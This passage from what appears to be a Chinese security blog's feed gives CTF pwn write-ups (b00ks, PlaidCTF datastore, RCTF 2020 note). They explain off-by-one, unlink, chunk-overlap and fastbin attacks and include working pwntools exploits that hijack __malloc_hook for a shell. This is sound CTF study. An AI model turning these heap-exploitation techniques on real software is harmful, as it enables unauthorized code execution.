[rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_addr</span><br><span class="line"></span><br><span class="line">exit(p64(malloc_hook - <span class="number">0x60</span>))</span><br><span class="line">pause()</span><br><span class="line">movie(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line">gift()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;受到摸鱼和各种项目压力之后，终于发出来了，这次是强网杯中强网先锋的4道pwn题，剩下的pwn题还在陆续复现ing，在做了在做了ing&lt;/p&gt;
&lt;h2 id=&quot;babymessage&quot;&gt;&lt;a href=&quot;#babymessage&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="stackoverflow" scheme="https://hurricane618.me/tags/stackoverflow/"/>
    
      <category term="heap" scheme="https://hurricane618.me/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>glibc堆利用之off by one的两道CTF题目</title>
    <link href="https://hurricane618.me/2020/08/07/glibc-pwn-off-by-one-1/"/>
    <id>https://hurricane618.me/2020/08/07/glibc-pwn-off-by-one-1/</id>
    <published>2020-08-07T13:32:14.000Z</published>
    <updated>2020-08-07T13:32:14.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="b00ks"><a href="#b00ks" class="headerlink" title="b00ks"></a>b00ks</h2><p>这是一道asis ctf 2016的题目，主要功能是书本记录，除了基本的书本的增删改查功能，还有一个作者名称的改变。程序是一个基本保护除了canary其他全开的64位程序。</p><p>调试写exp的过程参考了ctf-wiki，<a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">先知社区一篇文章</a>，和<a href="https://cq674350529.github.io/2018/06/05/asis-ctf-2016-pwn-b00ks/" target="_blank" rel="noopener">另外一个博客</a>。很多细节上面的文章已经写的很详细了，我补充一些其他细节点。</p><p>这里漏洞的问题是出现在程序自定义的读取函数中，在读完规定长度的数据之后又会在末尾填一个0，这样就会溢出一个空字节。这种漏洞被称为OBO（off by one），这里一共使用了两次，第一次是先把作者name全部填满，这样溢出的0字节就在下一个区域中，随后这个程序有一个管理全局书本的指针数组写在这个name后面，这个操作会覆盖掉那个溢出的0字节，恰巧这个name会被当做字符串输出这样后面的指针就被泄露；第二次是在name后面有指针数组的情况下我们继续重复填充满name字段，这样0字节就会覆盖指针数组中的第一个指针的最低位，改变指针指向的地址，使得指向我们伪造的数据结构。</p><p>所以，obo漏洞可以做到：</p><ol><li>如果该漏洞后面有数据写入，有可能泄露数据</li><li>可以通过溢出一个字节改变指针指向的位置，让它指向伪造的数据。如果在name后面的是其他重要的数据，也可以覆盖达到一些其他效果</li></ol><p>这里伪造数据结构是第二个难点，如果我们在分配空间的时候太小，有可能在覆盖成0字节之后超过了我们能写入的范围，所以在分配的时候尽量大一点。创建书本的过程会先创建book_name，随后是book_description，最后是创建书本的数据结构。结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> book_id</span><br><span class="line">    <span class="keyword">char</span>* book_name</span><br><span class="line">    <span class="keyword">char</span>* book_description</span><br><span class="line">    <span class="keyword">int</span> book_size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个结构的指针会被写入name后面的指针数组中。我们能改变的只有description部分，在我们覆盖指针数组中的第一个指针末尾的0字节之后，让其指向description区域，我们在其中就可以伪造结构，让那两个指针指向我们想要读/写的地方，我们就可以任意读写。</p><p>这里的description的偏移需要自己调试来计算，如果是在真实环境下，可能需要循环多试很多次。</p><p>由于开启了FULL RELRO，我们不能直接修改got表，所以这里想到的方法是改写<code>__free_hook</code>或<code>__malloc_hook</code>。但是改写这个就需要libc的地址，我们怎么搞到呢？其实我们在有任意读写的时候，创建一个很大的book2，这样分配内存的时候就会使用mmap的方式，读取到这个地址去计算与libc基地址的offset，之后实际中拿到地址减去这个offset就是libc基地址。</p><p>最后，拿到<code>__free_hook</code>的地址覆盖book2的description指针，之后再对book2的description写入我们的one-gadget，这样一旦出现free，检查到<code>__free_hook</code>不为空，就会执行触发getshell。</p><h3 id="另外的方法"><a href="#另外的方法" class="headerlink" title="另外的方法"></a>另外的方法</h3><p>这里另外的方法就是unlink，这里的off-by-one的漏洞很神奇，不仅仅是在改名字那里有，在修改book描述的地方也有1字节的溢出，只是两种溢出的方式触发不太一样。</p><img src="/2020/08/07/glibc-pwn-off-by-one-1/1.png"><p>在改名字那里因为给入的是32，所以a2为32，最后退出是循环是因为回车，而改book描述那里是因为给定的输入为<code>长度-1</code>，最后多写一个字节是因为长度到了。</p><p>所以思路就是让一个book的描述部分伪造出一个chunk，同时溢出一个字节，让下面的描述chunk部分的size最低字节为0，这样我们在free下面的chunk时，会和上面的伪造区块合并，这个时候就会触发unlink，修改一个指定指针。这个指定指针我们选的是book4的描述指针，这样指针移动到了前面，我们再次编辑book4就能修改book4的描述指针指向其他我们的可控区域，比如这里的book6的描述指针区域。通过修改book4的描述就能控制book6的描述指针，改完之后用打印就能任意读数据，如果再修改book6的描述内容就是任意写。</p><p>有了任意读写，这里就还是一样的思路先泄露libc地址，然后找<code>__free_hook</code>，我们在里面写入<code>system</code>的地址，最后free掉book6，因为book6的名字部分是<code>/bin/sh</code>所以就能getshell。</p><h2 id="datastore"><a href="#datastore" class="headerlink" title="datastore"></a>datastore</h2><p>这个是2015 plaidctf的题目，一共有四个操作指令GET、PUT、DUMP、DEL，其中的数据结构逆向较一般的题目要更为复杂，最核心的是一个树结构，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *key;</span><br><span class="line">    <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">char</span> *data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">right</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">parent</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> is_leaf;</span><br></pre></td></tr></table></figure><p>整个逆向的过程有点复杂，首先是通过树节点第一次初始化那里大概能够判断出前面三个成员，后面的四个结构成员需要结合DUMP和DEL来综合判断。以后遇到这种拥有很多指针而且经常有规律改动的数据结构就可以往树的结构猜想了。</p><p>然而对程序整体分析之后发现，漏洞利用和这个树结构关系不大，最重要的关系是其中的堆分配操作，有点蛋疼。。。这个程序的漏洞点在自定义的一个输入函数中（0x1040）。</p><img src="/2020/08/07/glibc-pwn-off-by-one-1/2.png"><p>我们把chunk填满的时候，v1会指向下一字节，如果这个时候末尾是<code>\n</code>，就会退出循环向v1指向的地方写入0，这就溢出了一个null字节。</p><p>这道题和上一道题不一样的地方在于溢出周围的数据不一样，上一道题能够溢出修改指针，但是这道题只能溢出到chunk管理结构中的size上。不过尽管只能溢出到size上还是能发挥出巨大的威力，size中的最后一位表示上个chunk是否在使用，覆盖之后可以让堆管理操作合并堆块构造出UAF的情况。其中的方法采用的ctf-wiki的<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#_9" target="_blank" rel="noopener">思路</a>。</p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>为了构造出我们可控的堆块顺序，首先会分配很多data大小为0x38的块，然后再释放掉，这样之后需要分配的时候就会从fastbin中获取，而不会破坏我们构造的堆块顺序。</p><p>为了构造出chunk overlap的情况，需要有堆块合并，所以在首尾的堆块必须要超过fastbin的大小，最后的堆块被当做溢出的对象还需要保证堆块大小为0x100的整数倍，这样溢出覆盖不会产生其他的影响。</p><p>在这两个堆块中间需要有个堆块拿来泄露libc地址，然后有个堆块拿来作为fastbin attack，最后还有个堆块拿来溢出到下一块。（在ctf-wiki里面的说法存在一点问题，提到用于溢出的块时说需要为small bin或者unsorted bin的堆块，其实不需要这个限制，只要保证不被0x20和0x40的堆块影响就行，所以这里换成0x80的堆块也是可以的，申请的大小为0x78）</p><p>最终完整的堆块构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|      1     |  &lt;-- free 的 size == 0x200 chunk</span><br><span class="line">+------------+</span><br><span class="line">|      2     |  &lt;-- size == 0x60 fastbin chunk，已被分配，且可以读出数据</span><br><span class="line">+------------+</span><br><span class="line">|      5     |  &lt;-- size == 0x71 fastbin chunk，为 fastbin attack 做准备</span><br><span class="line">+------------+</span><br><span class="line">|      3     |  &lt;-- size == 0x200 free 状态的 smallbin/unsortedbin chunk 可写size为0x1f8</span><br><span class="line">+------------+</span><br><span class="line">|      4     |  &lt;-- size == 0x101 被溢出 chunk</span><br><span class="line">+------------+</span><br><span class="line">|      X     |  &lt;-- 任意分配后 chunk 防止 top 合并</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p>先逐次分配上面的堆块，末尾的防合并堆块可以小一点否则small bin和unsorted bin中没有合适的堆块会触发堆块的整合，然后释放5，3，1，随后溢出修改堆块4的pre_size和size，释放堆块4，让前面的1，2，5，3和4合并成一个大块放入unsorted bin中，最后再次分配0x200大小的堆块，unsorted bin会在堆块2中写入main_arean的地址，读出2之后可以获得libc的地址。</p><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>我们拿到libc地址之后，再次分配一个覆盖原来堆块2和堆块3的大小比如：0x100，这样修改fastbin中的fd指针，指向我们想要伪造的堆块，这里选择的是<code>__malloc_hook</code>，通过小幅度偏移伪造正常的堆块。最终的利用就很简单了，分配两次0x60的堆块，在第二次写入one_gadget到<code>__malloc_hook</code>中，随便输入一些指令就能触发malloc，拿到最后的shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line">io = process(<span class="string">'./datastore'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(key)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'GET'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'key:\n'</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line">    io.recvuntil(<span class="string">'['</span>)</span><br><span class="line">    num = int(io.recvuntil(<span class="string">' byte'</span>, drop=<span class="keyword">True</span>))</span><br><span class="line">    io.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recv(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(key, size, data)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'PUT'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'key:\n'</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line">    io.recvuntil(<span class="string">'size:\n'</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">'data:\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(data) &lt; size:</span><br><span class="line">        io.send(data.ljust(size, <span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(key)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'DEL'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'key:\n'</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    put(str(i), <span class="number">0x38</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    delete(str(i))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">put(<span class="string">'1'</span>, <span class="number">0x200</span>, <span class="string">'1'</span>)</span><br><span class="line">put(<span class="string">'2'</span>, <span class="number">0x50</span>, <span class="string">'2'</span>)</span><br><span class="line">put(<span class="string">'5'</span>, <span class="number">0x68</span>, <span class="string">'5'</span>)</span><br><span class="line">put(<span class="string">'3'</span>, <span class="number">0x1f8</span>, <span class="string">'3'</span>)</span><br><span class="line">put(<span class="string">'4'</span>, <span class="number">0xf0</span>, <span class="string">'4'</span>)</span><br><span class="line">put(<span class="string">'defense'</span>, <span class="number">0x40</span>, <span class="string">'defense-data'</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># free those need to be freed</span></span><br><span class="line">delete(<span class="string">'5'</span>)</span><br><span class="line">delete(<span class="string">'3'</span>)</span><br><span class="line">delete(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'a'</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x4e0</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'4'</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># put('0x200', 0x200, 'fillup')  # get another chunk 0x200</span></span><br><span class="line">put(<span class="string">'0x200 fillup'</span>, <span class="number">0x200</span>, <span class="string">'fillup again'</span>)</span><br><span class="line"></span><br><span class="line">libc_leak = u64(get(<span class="string">'2'</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">info(<span class="string">'libc leak: 0x%x'</span> % libc_leak)</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">'libc_base: 0x%x'</span> % libc_base)</span><br><span class="line"></span><br><span class="line">put(<span class="string">'fastatk'</span>, <span class="number">0x100</span>, <span class="string">'a'</span> * <span class="number">0x58</span> + p64(<span class="number">0x71</span>) + p64(libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> + <span class="number">5</span> - <span class="number">8</span>))  <span class="comment"># change fd</span></span><br><span class="line">put(<span class="string">'prepare'</span>, <span class="number">0x68</span>, <span class="string">'prepare data'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">put(<span class="string">'attack'</span>, <span class="number">0x68</span>, <span class="string">'a'</span> * <span class="number">3</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'DEL'</span>) <span class="comment"># malloc(8) triggers one_gadget</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h3><p><a href="https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/" target="_blank" rel="noopener">https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/</a></p><p>详细一点的有看雪的一个<a href="https://bbs.pediy.com/thread-246966.htm" target="_blank" rel="noopener">帖子</a>和先知社区的<a href="https://xz.aliyun.com/t/6169#toc-3" target="_blank" rel="noopener">帖子</a></p><p>这个做法更加复杂，没有像上面的做法先释放很多堆块拿来当做树结构堆块，这样就要考虑到每次树结构的分配对堆块布局的影响，并且最后在覆盖的时候需要考虑不破坏之前堆上的数据。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>off by one的利用总的来说思路有：</p><ol><li>如果能修改到指针，那么可以尝试构造unlink和任意读写</li><li>如果只能修改堆块的size，那么可以尝试chunk overlap</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;b00ks&quot;&gt;&lt;a href=&quot;#b00ks&quot; class=&quot;headerlink&quot; title=&quot;b00ks&quot;&gt;&lt;/a&gt;b00ks&lt;/h2&gt;&lt;p&gt;这是一道asis ctf 2016的题目，主要功能是书本记录，除了基本的书本的增删改查功能，还有一个作者名称的改变。
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="heap" scheme="https://hurricane618.me/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>2020RCTF 几道pwn题的复现</title>
    <link href="https://hurricane618.me/2020/08/01/2020rctf-some-pwn/"/>
    <id>https://hurricane618.me/2020/08/01/2020rctf-some-pwn/</id>
    <published>2020-08-01T06:29:06.000Z</published>
    <updated>2020-08-01T06:31:30.272Z</updated>
    
    <content type="html"><![CDATA[<p>博客长草严重，上半年摸鱼太久。最近趁着有空开始复现之前的一些题目，这次做了2020RCTF的几道pwn题，本来还想着把MIPS那道题做出来再发，结果发现MIPS的调试还有很多问题，所以就先发常规一点的题。</p><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p>最经典的菜单堆题，还是note管理系统。64位程序，保护全开。主要功能有new，sell，show，edit，经典的增删查改，除了基本功能之外，还有两个额外的功能，一个是<code>super note</code>，一个是越界写数据但是只能操作一次。</p><p>这个题的<code>super note</code>是个幌子，最后完全没有用到。它的数据结构是三个部分组成，开头是一个指针指向我们申请的message区域，第二块是size，表示message的大小，第三块是表示money。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+---------------+-----------&gt;+-------------+</span><br><span class="line">|     ptr       |            |             |</span><br><span class="line">|               |            |   message   |</span><br><span class="line">+---------------+            |             |</span><br><span class="line">|     size      |            +-------------+</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br><span class="line">|     money     |</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><h3 id="绕过money的限制"><a href="#绕过money的限制" class="headerlink" title="绕过money的限制"></a>绕过money的限制</h3><p>这里利用了它的index可以为负数的问题，我们可以向前修改数据，并且恰巧在index=-5时ptr的位置处有一个指针，它指向自己地址，同时在它的后面有存储着money的变量地址。这样我们就可以编辑下标为-5的地方，输入我们的值把money变大绕过分配note的限制。</p><p><code>edit(-5,&#39;a&#39;*8 + p64(0xfffffffffffffff) + &#39;\x01&#39;)</code></p><p>由于分配内存需要消耗<code>size*857</code>的钱，出售只能得到<code>size*64</code>的钱，所以这里还有另外一种绕过的方法，利用了寄存器溢出的问题，我们给一个很大的数，这个数<code>n</code>能够满足<code>n*857</code>溢出，<code>n*64</code>不会溢出，这样我们在用<code>money</code>比较<code>n*857</code>就能通过，但是在出售的时候却没有溢出，这个数就会很大，出售得到的钱足够我们使用。</p><p><code>new(0, 21524788884141834) sell(0)</code></p><h3 id="chunk-overlap"><a href="#chunk-overlap" class="headerlink" title="chunk overlap"></a>chunk overlap</h3><p>因为我们有一次越界写的机会，所以能轻松的修改掉chunk的size区域实现overlap。</p><p>由于有tcache的存在，我们需要分配超过<code>small bin</code>大小的chunk释放后才能进入<code>unsorted bin</code>。我们在头部和尾部分配小chunk，头部chunk拿来溢出，尾部chunk为了避免和<code>top chunk</code>合并。溢出修改size之后释放，就会进入<code>unsorted bin</code>，它的<code>fd</code>和<code>bk</code>指针会指向<code>main_arena</code>区域，随后我们分配它原始大小的chunk，这样剩下的部分会移动进overlap的chunk中，这个时候再使用show功能泄露地址，通过<code>main_arena</code>我们可以计算出libc基地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)  <span class="comment"># 0x100</span></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">6</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">once(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x28</span> + p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line">sell(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure><p>除了使用<code>unsorted bin</code>来泄露地址之外，还可以使用<code>large bin</code>的chunk来泄露地址。</p><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>在知道libc基地址之后，我们剩下的工作就是向<code>__malloc_hook</code>或者<code>__free_hook</code>中写入<code>one_gadget</code>。首先，我们新分配一个大小为0x60的note，这个的chunk会和原来的index=3的note重合，我们再释放index=3的note，为了让它进入<code>fastbin</code>，我们必须要先把<code>tcache</code>塞满7个。释放之后，我们拿新分配的note写入需要伪造的地址，这样我们再次分配两次，第二次就能拿到伪造地址的chunk。</p><p>这个伪造地址也是很讲究的，它的size区域必须要符合fastbin的检查，而为了方便我们一般会写<code>__malloc_hook</code>之前偏移的一部分，通过偏移能够凑出size大小为<code>0x7f</code>，同时我们还能覆盖<code>__realloc_hook</code>。如果我们的one_gadget无法满足条件，那么我们可以在<code>__realloc_hook</code>中写入one_gadget，<code>__malloc_hook</code>中写入<code>__libc_realloc</code>加上一定偏移。这个偏移是决定pop的数量，为了满足条件以此来调整栈的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">sell(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, p64(fake_addr))</span><br><span class="line">new(<span class="number">8</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">'a'</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>一道<code>chunk overlap</code>+<code>fastbin attack</code>的题目。里面通过调试学到了一个有趣的地方，<code>calloc</code>在分配chunk的时候，不会从tcache中拿chunk，仔细想想<code>calloc</code>在分配的时候会对内存做初始化操作，可能也是因为这个原因所以分配tcache缓存的意义不大。（纯属推测）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./note'</span>)</span><br><span class="line"><span class="comment">#io = remote('124.156.135.103', 6004)</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 